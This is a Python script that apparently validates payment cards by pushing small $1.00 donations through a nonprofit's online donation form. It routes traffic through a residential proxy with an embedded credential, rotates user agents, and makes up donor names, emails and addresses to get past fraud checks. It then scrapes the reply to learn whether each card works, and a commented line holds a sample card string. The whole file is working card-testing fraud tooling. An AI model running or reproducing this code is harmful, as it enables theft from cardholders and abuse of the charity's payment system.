import random
import string
import requests
from user_agent import generate_user_agent
from proxy import reqproxy, make_request
import json
import re
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from urllib.parse import urlparse, urlencode, parse_qs

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    proxy_str = "proxy.insideproxy.net:3389:res-any:pgw-df6b371b8ec65c798929f20b1b3257302159d84a48d2a1d5"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx=ccx.strip()
    numbers = re.findall(r"\d+", ccx)
    n = mm = yy = cvc = ""
    if len(numbers) >= 4:
        n = numbers[0]
        mm = numbers[1]
        yy = numbers[2]
        cvc = numbers[3]
        mm = str(int(mm))
        if len(yy) == 4:
            yy = yy[-2:]

    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    
    headers = {
        'authority': 'support.marketplace.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'referer': 'https://www.google.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = session.get('https://support.marketplace.org/futures', headers=headers)
    
    build = re.search(r'name="form_build_id" value="(.*?)"', response.text).group(1)
    form = re.search(r'name="form_id" value="(.*?)"', response.text).group(1)
    print(build)
    print(form)
    
    cookies = {
        '_vwo_uuid_v2': 'D49A2B843A8DA280D62F20EDD5631481B|e9eff17de991a0703143964af9df87dd',
        'cookies_enabled': '1',
        '_gcl_au': '1.1.2116484102.1779827490',
        '_vwo_uuid': 'D49A2B843A8DA280D62F20EDD5631481B',
        '_vwo_ds': '3%241779827489%3A46.25598993%3A%3A%3A%3A%3A1779827489%3A1779827489%3A1',
        '_ga': 'GA1.1.1209697074.1779827491',
        '_vis_opt_s': '1%7C',
        '_vis_opt_test_cookie': '1',
        'Springboard': '8%2F3yepMdK2LQNuJSSB%2BRd%2FfakvrqUonSJv%2BUbaWXzdkS8G%2F%2BzU2wZAXNXhK9U%2F0A',
        '__qca': 'P1-8dd900d0-5925-4468-9900-cf147e902656',
        '_fbp': 'fb.1.1779827491947.31930883787665988.AQYAAQIB',
        '_vwo_sn': '0%3A1%3A%3A%3A%3A%3A56',
        '_ga_GDG55HC8ZN': 'GS2.1.s1779827490$o1$g1$t1779827567$j60$l0$h2020327361',
    }
    
    headers = {
        'authority': 'support.marketplace.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryP1r2vz12AXyO1jgN',
        # 'cookie': '_vwo_uuid_v2=D49A2B843A8DA280D62F20EDD5631481B|e9eff17de991a0703143964af9df87dd; cookies_enabled=1; _gcl_au=1.1.2116484102.1779827490; _vwo_uuid=D49A2B843A8DA280D62F20EDD5631481B; _vwo_ds=3%241779827489%3A46.25598993%3A%3A%3A%3A%3A1779827489%3A1779827489%3A1; _ga=GA1.1.1209697074.1779827491; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; Springboard=8%2F3yepMdK2LQNuJSSB%2BRd%2FfakvrqUonSJv%2BUbaWXzdkS8G%2F%2BzU2wZAXNXhK9U%2F0A; __qca=P1-8dd900d0-5925-4468-9900-cf147e902656; _fbp=fb.1.1779827491947.31930883787665988.AQYAAQIB; _vwo_sn=0%3A1%3A%3A%3A%3A%3A56; _ga_GDG55HC8ZN=GS2.1.s1779827490$o1$g1$t1779827567$j60$l0$h2020327361',
        'origin': 'https://support.marketplace.org',
        'referer': 'https://support.marketplace.org/futures',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    files = [
        ('submitted[donation][recurs_monthly]', (None, 'NO_RECURR')),
        ('submitted[donation][amount]', (None, 'other')),
        ('submitted[donation][other_amount]', (None, '1.00')),
        ('submitted[donation][recurring_amount]', (None, '125')),
        ('submitted[donation][recurring_other_amount]', (None, '')),
        ('submitted[ms]', (None, 'default_ms')),
        ('selected-premium-id', (None, '0')),
        ('submitted[premiums][premiums_box][premium-wrapper][1930][inventory-threshold]', (None, '')),
        ('submitted[premiums][premiums_box][premium-wrapper][1930][admin-inventory-threshold]', (None, '')),
        ('submitted[premiums][premiums_box][premium-wrapper][1930][enable-restock]', (None, '1')),
        ('submitted[premiums][premiums_box][premium-wrapper][1930][selected-sku]', (None, 'NME2401')),
        ('submitted[premiums][premiums_box][premium-wrapper][1930][product_id]', (None, '2842')),
        ('submitted[premiums][premiums_box][premium-wrapper][premium-sku]', (None, '')),
        ('submitted[premiums][bonusgift][premium-wrapper][bonusgift-sku]', (None, '')),
        ('submitted[cid]', (None, '')),
        ('submitted[referrer]', (None, 'https://www.google.com/')),
        ('submitted[payment_information][payment_method]', (None, 'credit')),
        ('submitted[payment_information][payment_fields][credit][card_number]', (None, f'{n}')),
        ('submitted[payment_information][payment_fields][credit][expiration_date][card_expiration_month]', (None, f'{mm}')),
        ('submitted[payment_information][payment_fields][credit][expiration_date][card_expiration_year]', (None, f'20{yy}')),
        ('submitted[payment_information][payment_fields][credit][card_cvv]', (None, f'{cvc}')),
        ('submitted[payment_information][payment_fields][credit][card_type]', (None, '')),
        ('submitted[payment_information][payment_fields][bank account][accType]', (None, 'Checking')),
        ('submitted[payment_information][payment_fields][bank account][routingNum]', (None, '')),
        ('submitted[payment_information][payment_fields][bank account][accNum]', (None, '')),
        ('braintree[errors]', (None, '')),
        ('payment_method_nonce', (None, '')),
        ('submitted[payment_information][payment_fields][paypal][braintree_card_type]', (None, '')),
        ('submitted[payment_information][payment_fields][paypal][braintree_last4]', (None, '')),
        ('payment_method_nonce', (None, '')),
        ('payment_method_nonce', (None, '')),
        ('submitted[payment_information][payment_fields][applepay][braintree_card_type]', (None, '')),
        ('submitted[payment_information][payment_fields][applepay][braintree_last4]', (None, '')),
        ('submitted[payment_information][processing_fee_amount]', (None, '')),
        ('submitted[initial_referrer]', (None, 'https://www.google.com/')),
        ('submitted[donor_information][first_name]', (None, f'{first_name}')),
        ('submitted[donor_information][last_name]', (None, f'{last_name}')),
        ('submitted[donor_information][secondary_donor][secondary_donor_first_name]', (None, '')),
        ('submitted[donor_information][secondary_donor][secondary_donor_last_name]', (None, '')),
        ('submitted[donor_information][mail]', (None, f'{username}{nr}@gmail.com')),
        ('submitted[donor_information][mobile_phone]', (None, '')),
        ('submitted[billing_information][address]', (None, '27 Allen St')),
        ('submitted[billing_information][address_line_2]', (None, '')),
        ('submitted[billing_information][field_apt]', (None, '')),
        ('submitted[billing_information][city]', (None, 'New York')),
        ('submitted[billing_information][state]', (None, 'NY')),
        ('submitted[billing_information][zip]', (None, '10002')),
        ('submitted[billing_information][country]', (None, 'US')),
        ('submitted[search_engine]', (None, 'Google')),
        ('submitted[search_string]', (None, '')),
        ('submitted[sub_source_code]', (None, 'NF[YY]GWMF')),
        ('submitted[user_agent]', (None, 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36')),
        ('submitted[device_type]', (None, '')),
        ('submitted[springboard_cookie_autofilled]', (None, 'disabled')),
        ('submitted[device_name]', (None, '')),
        ('submitted[device_os]', (None, '')),
        ('submitted[device_browser]', (None, '')),
        ('submitted[origin_nid]', (None, '')),
        ('submitted[origin_form_name]', (None, '')),
        ('submitted[secure_prepop_autofilled]', (None, '0')),
        ('submitted[utm_source]', (None, '')),
        ('submitted[gs_flag]', (None, 'None')),
        ('submitted[utm_medium]', (None, '')),
        ('submitted[field_sbp_referrer_long]', (None, '')),
        ('submitted[utm_term]', (None, '')),
        ('submitted[field_sbp_initial_referrer_long]', (None, '')),
        ('submitted[utm_content]', (None, '')),
        ('submitted[field_form]', (None, '')),
        ('submitted[utm_campaign]', (None, '')),
        ('submitted[field_form_url]', (None, '')),
        ('submitted[eml_name]', (None, '')),
        ('submitted[eml_id]', (None, '')),
        ('submitted[ms_off]', (None, '')),
        ('submitted[ms_direct]', (None, '')),
        ('submitted[social_referer_transaction]', (None, '')),
        ('submitted[p2p_comm_ms]', (None, '')),
        ('submitted[p2p_comm_id]', (None, '')),
        ('submitted[p2p_pcid]', (None, '')),
        ('submitted[sbp_zip_plus_four]', (None, '')),
        ('details[sid]', (None, '')),
        ('details[page_num]', (None, '1')),
        ('details[page_count]', (None, '1')),
        ('details[finished]', (None, '0')),
        ('form_build_id', (None, f'{build}')),
        ('form_id', (None, f'{form}')),
        ('springboard_fraud_token', (None, '')),
        ('springboard_fraud_js_detect', (None, '')),
    ]
    
    response = session.post('https://support.marketplace.org/futures', cookies=cookies, headers=headers, files=files)
    
    try:
        result = re.search(r'<li>We received an error processing your card. Please enter your information again or try a different card.<\/li>\s*<li>(.*?)<\/li>', response.text).group(1)
    except:
        result = re.search(r"class='survey-container'><div class='survey-title'><h1>(.*?)<\/h1>", response.text).group(1)
    return result
    
#test_card = "5311024271771951|09|2034|218"
#print(Tele(test_card))
